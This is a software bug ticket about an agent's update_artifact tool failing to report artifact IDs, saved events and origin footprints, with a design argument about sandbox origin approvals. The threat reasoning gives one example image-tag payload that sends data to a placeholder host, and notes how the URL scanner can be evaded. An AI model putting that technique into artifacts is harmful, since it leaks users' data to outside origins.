---
id: av-hrtv
status: open
deps: []
links: [av-e0yj]
created: 2026-08-03T05:01:45Z
type: bug
priority: 3
assignee: Max Omdal
tags: [agent, api, ui]
---
# Agent updates report nothing: no id, no saved event, no preview refresh, no footprint

update_artifact reads a.id / a.title from the PATCH response, but that response is updateArtifactResponse — {artifact:{...}, network_footprint, footprint_changed} (internal/api/artifacts.go:443-447). There is no top-level id or title, so both are undefined. Three things follow:

1. The model is told 'Updated artifact undefined ("undefined")'.
2. details.artifactId is undefined, so Session.noteArtifactSaved returns early on the empty id (internal/agent/agent.go:463-466) and NO exhibit_artifact_saved event is emitted. The htmx preview refresh (av-6m3e) therefore never fires on a modification — only the create path works. Likely a contributor to Exh-m3bg (agent window feels unpredictable).
3. exhibit.ts:115-121 also omits footprint from the update details, which create_artifact does include (:89-96), so the chat UI's "it references external origins ..." note (web/gallery/agent.js:287-289) is skipped. A user is told when a NEW artifact wants an origin they have not approved; they are told nothing when a modified one does. Those origins are CSP-blocked either way — the gap is that the user is never prompted to make the origin decision.

Nothing tests any of this: cmd/mockllm exercises the update path but no test asserts the event.

## Not in scope: re-approval on rewrite

This ticket originally proposed dropping or re-gating an artifact's decision='allow' rows when an agent rewrote its body, on the theory that an approval should not outlive the code it was granted for. That is rejected, and the reasoning is recorded here so it is not re-proposed:

- Users approve ORIGINS, not code. Running unreviewed code safely is the entire purpose of the sandbox (architecture.md §4, spec §6). Re-gating on a body change is code review by another name, and since the agent tools always save complete documents rather than diffs, it would fire on every edit — approval fatigue, which is itself a security failure.
- Nothing about a rewrite is detectable in a way that matters. buildCSP applies one flat allowlist to every directive (internal/render/render.go:194-201), so an approved origin is reachable via script-src, connect-src, img-src, font-src, media-src and form-action simultaneously; "this origin used to be a script import and is now a fetch" describes no change in capability. Exfiltration does not even need connect-src — <img src="https://X/?d=DATA"> carries the payload in the URL. And the scanner is deliberately evadable (spec §6.2, a literal-URL heuristic over inline JS), so a rewrite that actually wants to exfiltrate constructs the URL at runtime and any such signal stays silent. Noisy on benign edits, blind on hostile ones.

Accepted risk, to be stated plainly in docs/security.md rather than tracked as an open gap: approving an origin for an artifact grants that artifact egress to that origin for whatever code it later contains, including code an agent wrote. What bounds the damage is not post-hoc review of the code but what data is reachable inside the sandbox at all — which is av-e0yj (keeping other artifacts out of the agent's reach), and the origin decision itself.

Note for later: if an actual control is ever wanted here it is per-directive allowlists (approve esm.sh for script-src only, so a fetch to it is browser-blocked regardless of any scan), which is enforcement rather than marking. Separate and larger; not this ticket.

## Design

Fix the response read and plumb the two missing fields.

- exhibit.ts update_artifact: read r.artifact.id / r.artifact.title, and include footprint (and footprint_changed) in the returned details the way create_artifact already does.
- Session.noteArtifactSaved already forwards details["footprint"] (agent.go:470-478) — once the field is populated the existing agent.js branch renders the note with no UI change.
- Surfacing the footprint on update is an ORIGIN decision, not a code review: the origins are new, unapproved, and currently blocked. Telling the user is what lets them approve, exactly as the create path does.

Sequence after av-e0yj: it is rewriting the same tool functions (dropping the id parameter), and it is allowed to fix this response read as it passes through. If it does, this ticket narrows to the footprint field and the tests.

## Acceptance Criteria

1. update_artifact returns a defined artifact id and title; a test asserts they are not undefined.
2. A successful update emits exhibit_artifact_saved and the agent preview pane swaps — covered by a test on the update path, not only the create path.
3. The chat UI shows the pending-approval note after a modification introduces an unapproved origin, as it already does after a creation.
4. Approvals are NOT dropped or re-gated on a body rewrite; a test pins that an artifact with origin X approved still has X approved after an agent update.
5. docs/security.md states the accepted risk: an approved origin grants egress for whatever code the artifact later contains.
